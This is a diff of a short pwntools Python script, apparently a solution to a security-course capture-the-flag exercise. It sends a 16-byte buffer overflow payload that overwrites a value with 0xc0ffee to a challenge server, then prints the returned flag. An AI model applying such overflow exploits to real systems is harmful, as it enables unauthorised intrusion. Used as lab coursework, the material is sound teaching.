@@ -1,10 +1,16 @@
 #!/usr/bin/python3
 
 from pwn import *
+from pwn import p64
 
 io = remote('inf226.puffling.no', 7000)
 
-line = b'A' * 16 + b'\xee\xff\xc0\x00'
+line = cyclic(16) + p64(0xc0ffee)
 io.sendline(line)
 
-print(io.recvall())
+
+recieved = io.recvall().decode()
+flag = recieved.splitlines()[-1]
+print(f'Flag 00: {flag}')
+
+
